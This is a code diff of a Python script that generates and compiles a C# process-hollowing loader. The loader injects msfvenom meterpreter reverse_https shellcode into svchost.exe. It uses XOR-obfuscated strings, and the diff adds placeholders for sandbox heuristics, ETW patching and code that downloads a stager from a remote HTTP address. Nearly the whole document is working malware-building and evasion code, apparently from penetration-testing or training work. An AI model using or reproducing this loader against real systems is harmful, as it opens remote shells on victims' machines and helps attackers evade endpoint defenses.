@@ -9,10 +9,11 @@ BASE_FILENAME = 'win_hollow'
 MSFVENOM_CMD = f"msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_https LHOST={LHOST} LPORT={LPORT} -f raw -e generic/none"
 SVCHOST_PATH = b"C:\\\\Windows\\system32\\svchost.exe"
 XOR_KEY = b'\x09'
-STAGER_URL = "http://192.168.49.65/stager_hollow.woff"
+STAGER_URL = "http://192.168.49.65/sc"
 
-def generate(shellcode):
+def generate():
   svchost_path = Obfuscator(SVCHOST_PATH, XOR_KEY)
+  url_dl_code = URL_DL_CODE.format(STAGER_URL=STAGER_URL)
 
   template = """
 using System;
@@ -67,11 +68,11 @@ namespace Hallo
         }}
 
         [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
-		static extern bool CreateProcess( string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+        static extern bool CreateProcess( string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
 
 
         [DllImport("ntdll.dll", SetLastError = true)]
-static extern UInt32 ZwQueryInformationProcess( IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, UInt32 ProcInfoLen, ref UInt32 retlen);
+        static extern UInt32 ZwQueryInformationProcess( IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, UInt32 ProcInfoLen, ref UInt32 retlen);
 
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern bool ReadProcessMemory( IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
@@ -82,41 +83,17 @@ static extern UInt32 ZwQueryInformationProcess( IntPtr hProcess, int procInforma
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern uint ResumeThread(IntPtr hThread);
 
-        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        public static extern IntPtr GetCurrentProcess();
-
-        [DllImport("kernel32.dll")]
-        static extern void Sleep(uint dwMilliseconds);
+	{HEURISTICS_IMPORT}
+	{ARCH_DETECTION}
+	{ETW_FUNCS}
 
         static void Main(string[] args)
         {{
-            DateTime t1 = DateTime.Now;
-            Sleep(2000);
-            double t2 = DateTime.Now.Subtract(t1).TotalSeconds; if(t2 < 1.5)
-            {{ return; }}
-
-            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
-            if (mem == null)
-            {{
-                return;
-            }}
-
-            byte[] buf = new byte[] {{ {xor_shellcode}  }};
-            // string url = "{stager_url}";
-
-            // ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
-            // System.Net.WebClient client = new System.Net.WebClient();
-            // byte[] buf = client.DownloadData(url);
+	    {HEURISTICS_CODE}
+	    {ETW_PATCH}
+	    {URL_DL_CODE}
 
             byte[] buf2 = new byte[] {{ {xor_svchost_path} }};
-
-            for (int i = 0; i < buf.Length; i++)
-            {{
-                buf[i] = (byte)(((uint)buf[i] ^ {xor_key}) & 0xFF);
-            }}
 
             for (int i = 0; i < buf2.Length; i++)
             {{
@@ -159,8 +136,15 @@ static extern UInt32 ZwQueryInformationProcess( IntPtr hProcess, int procInforma
         }}
     }}
 }}
-
-  """.format(xor_shellcode=shellcode.get_hex_csharp(),xor_svchost_path=svchost_path.get_hex_csharp(), xor_key=shellcode.get_key_csharp(), stager_url=STAGER_URL)
+""".format(HEURISTICS_IMPORT=HEURISTICS_IMPORT,
+           HEURISTICS_CODE=HEURISTICS_CODE,
+           ARCH_DETECTION=ARCH_DETECTION,
+           ETW_FUNCS=ETW_FUNCS,
+           ETW_PATCH=ETW_PATCH,
+           URL_DL_CODE=url_dl_code,
+           xor_key=svchost_path.get_key_csharp(),
+           xor_svchost_path=svchost_path.get_hex_csharp()
+           )
 
   print(template)
   f = open(BASE_FILENAME + '.cs', "w")
@@ -169,10 +153,6 @@ static extern UInt32 ZwQueryInformationProcess( IntPtr hProcess, int procInforma
 
   print("Wrote "+ BASE_FILENAME + '.cs')
 
-  f = open(BASE_FILENAME + '.xsc', "wb")
-  f.write(shellcode.get_bytes())
-  f.close()
-  print("Wrote shellcode to "+ BASE_FILENAME + '.xsc')
 
 def compile():
   cmd = f"mcs {BASE_FILENAME}.cs"
@@ -182,8 +162,13 @@ def compile():
 def main():
   shellcode = ShellCode(MSFVENOM_CMD, xor_key=XOR_KEY)
 
-  generate(shellcode)
+  generate()
   compile() 
+
+  f = open(BASE_FILENAME + '.sc', "wb")
+  f.write(shellcode.get_bytes())
+  f.close()
+  print("Wrote shellcode to "+ BASE_FILENAME + '.sc')
 
 
 if __name__ == "__main__":
